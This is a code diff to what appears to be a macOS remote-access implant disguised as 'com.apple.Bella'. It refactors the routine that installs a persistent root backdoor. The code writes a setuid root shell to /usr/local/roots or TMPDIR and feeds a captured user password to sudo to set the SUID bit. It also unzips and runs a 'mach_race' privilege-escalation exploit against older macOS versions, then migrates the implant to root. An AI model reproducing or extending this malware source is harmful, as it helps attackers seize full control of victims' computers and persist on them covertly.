@@ -313,7 +313,7 @@ def is_there_SUID_shell():
 	if os.getuid() == 0:
 		return True
 
-	if os.path.isfile('/usr/local/roots'):
+	if os.path.isfile(ROOT_SHELL_PATH):
 		return True
 
 	if local_pw_read():
@@ -327,9 +327,9 @@ def is_there_SUID_shell():
 	return False
 
 def remove_SUID_shell():
-	if os.path.isfile('/usr/local/roots'):
+	if os.path.isfile(ROOT_SHELL_PATH):
 		try:
-			os.system('/usr/local/roots rm /usr/local/roots > /dev/null')
+			os.system('%s rm %s > /dev/null' % (ROOT_SHELL_PATH, ROOT_SHELL_PATH))
 			#send_msg('%sRemoved temporary root shell.\n' % yellow_star, False) #%
 		except Exception as e:
 			pass
@@ -347,7 +347,7 @@ def do_root(command):
 	else:
 		if not is_there_SUID_shell():
 			return (False, '%sThere is no root shell to perform this command. See [rooter] manual entry.\n' % red_minus)
-		output = subprocess.Popen("/usr/local/roots \"%s\"" % (command), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+		output = subprocess.Popen("%s \"%s\"" % (ROOT_SHELL_PATH, command), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 		out = output.stdout.read()
 		err = output.stderr.read()
 		if err != '':
@@ -1308,9 +1308,20 @@ def recvaux(sock, n, length):
 	return pickle.loads(data) #convert from serialized into normal.
 
 def make_SUID_root_binary(password, LPEpath):
+	global ROOT_SHELL_PATH
 	root_shell = readDB("root_shell", True)
-	with open("/usr/local/roots", "w") as content:
-		content.write(root_shell.decode('base64'))
+	try:
+		with open("/usr/local/roots", "w") as content:
+			content.write(root_shell.decode('base64'))
+		ROOT_SHELL_PATH = '/usr/local/roots'
+	except IOError as e:
+		if e.errno == 13:
+			#for whatever reason we can write to /usr/local (domain environments typically)
+			with open(os.environ['TMPDIR'] + 'roots', "w") as content:
+				content.write(root_shell.decode('base64'))
+			ROOT_SHELL_PATH = os.environ['TMPDIR'] + 'roots'
+		else:
+			raise IOError
 	if not LPEpath: #use password
 		(username, password) = password.split(':')
 		try:
@@ -1318,17 +1329,20 @@ def make_SUID_root_binary(password, LPEpath):
 		except Exception as e:
 			return (False, "%sUser's local password does not give us sudo access!\n" % red_minus)
 		try:
-			subprocess.check_output("echo %s | sudo -S chown 0:0 /usr/local/roots; echo %s | sudo -S chmod 4777 /usr/local/roots" % (password, password), shell=True) #perform setUID on shell
+			subprocess.check_output("echo %s | sudo -S chown 0:0 %s; echo %s | sudo -S chmod 4777 %s" % (password, ROOT_SHELL_PATH, password, ROOT_SHELL_PATH), shell=True) #perform setUID on shell
 		except Exception as e:
 			return (False, "%sUser's local password gives us sudo access!\n%sThere was an error setting the SUID bit.\n[%s]\n" % (greenPlus, red_minus, e))
-		return (True, "%sUser's local password gives us sudo access!\n%sSUID root file written to /usr/local/roots!\n" % (blue_star, greenPlus))
+		return (True, "%sUser's local password gives us sudo access!\n%sSUID root file written to %s!\n" % (blue_star, greenPlus, ROOT_SHELL_PATH))
 	else:
 		#LPEpath should be a path to an interactive root shell (thinking mach race)
 		#### IF THIS LINE IS STILL HERE, THEN THIS MACH RACE / LPE DOES NOT WORK. Code needs to be added to actually install the shell ####
-		fugazy = subprocess.Popen("%s <<< 'chown 0:0 /usr/local/roots; chmod 4777 /usr/local/roots'" % LPEpath, shell=True, stdout=PIPE, stderr=PIPE)
+		cur_dir = os.getcwd()
+		os.chdir('%s' % LPEpath)
+		fugazy = subprocess.Popen("./root_shell.sh <<< 'chown 0:0 %s; chmod 4777 %s'" % (ROOT_SHELL_PATH,ROOT_SHELL_PATH), shell=True, stdout=PIPE, stderr=PIPE)
+		os.chdir(cur_dir)
 		error = fugazy.stderr.read()
 		if not 'traceroute6: invalid wait time' in error: #perform setUID on shell
-			return (True, "%sUser is susceptible to LPE!\n%sSUID root file written to /usr/local/roots!\n" % (blue_star, greenPlus))
+			return (True, "%sUser is susceptible to LPE!\n%sSUID root file written to %s!\n" % (blue_star, greenPlus, ROOT_SHELL_PATH))
 		else:
 			remove_SUID_shell()
 			return (False, "%sUser is susceptible to LPE!\n%sThere was an error setting the SUID bit and escalating.\n[%s]\n" % (greenPlus, red_minus, error.replace('\n', '')))
@@ -1425,7 +1439,7 @@ def rooter(): #ROOTER MUST BE CALLED INDEPENDENTLY -- Equivalent to getsystem
 
 	sys_vers = str(platform.mac_ver()[0])
 	if is_there_SUID_shell():
-		migrateToRoot('/usr/local/roots')
+		migrateToRoot(ROOT_SHELL_PATH)
 		send_msg('', True)
 		return
 	
@@ -1437,19 +1451,24 @@ def rooter(): #ROOTER MUST BE CALLED INDEPENDENTLY -- Equivalent to getsystem
 		if binarymake[0]:
 			#updateDB('local user password', 'rootedMethod')
 			#send_msg('', True)
-			migrateToRoot('/usr/local/roots')
+			migrateToRoot(ROOT_SHELL_PATH)
 			send_msg('', True)
 			return
 	else:
 		send_msg("%sNo local user password found. This will give us system and can be phished.\n" % red_minus, False)
 
 	if sys_vers.startswith("10.8") or sys_vers.startswith("10.9") or sys_vers.startswith("10.10") or sys_vers == ("10.11") or sys_vers == ("10.11.1") or sys_vers == ("10.11.2") or sys_vers == ("10.11.3"):
-		root_escalate = payload_generator(readDB('mach_race', True))
+		zipped = readDB('mach_race', True)
+		paths = payload_generator(zipped)
+		dirs = '/'.join(paths.split('/')[:-1]) + '/' 
+		os.system("unzip %s -d %s" % (paths, dirs))
+		send_msg("unzip %s -d %s\n\n" % (paths, dirs), False)
+		root_escalate = '%sexecuter/' % dirs
 		binarymake = make_SUID_root_binary(None, root_escalate)
 		if binarymake[0]:
 			#updateDB('local privilege escalation', 'rootedMethod')
 			send_msg(binarymake[1], False)
-			migrateToRoot('/usr/local/roots')
+			migrateToRoot(ROOT_SHELL_PATH)
 			send_msg('', True)
 			return
 		else:
@@ -2120,7 +2139,7 @@ else:
 	bella_UID = pwd.getpwnam(bella_user).pw_uid
 
 bellaPID = os.getpid()
-
+ROOT_SHELL_PATH = '/usr/local/roots' #try not to change this, it causes permissions errors.
 launch_agent_name = 'com.apple.Bella'
 bella_folder = 'Containers/.bella'
 if os.getuid() == 0:
